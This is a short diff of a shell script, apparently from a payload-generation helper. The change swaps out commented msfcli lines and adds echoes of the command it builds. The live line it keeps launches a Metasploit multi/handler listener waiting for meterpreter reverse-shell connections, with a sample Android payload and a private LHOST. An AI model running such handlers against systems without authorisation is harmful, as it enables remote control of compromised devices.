@@ -64,11 +64,9 @@ else
 fi
 
 
-#echo "Running with....  msfcli exploit/multi/handler PAYLOAD=$THEPAYLOAD LHOST=$IP LPORT=$port E"
-#echo "      starting the meterpreter listener.."
-# msfconsole -x "use android/meterpreter/reverse_tcp;set LHOST 192.168.1.66;set LPORT 6666;exploit"
+echo "Generated command is..."
+echo 'msfconsole -x "use exploit/multi/handler;set payload '$THEPAYLOAD';set LHOST '$IP';set LPORT '$port';exploit"'
 msfconsole -x "use exploit/multi/handler;set payload $THEPAYLOAD;set LHOST $IP;set LPORT $port;exploit"
-#msfcli exploit/multi/handler PAYLOAD=$THEPAYLOAD LHOST=$IP LPORT=$port E
 
 
 
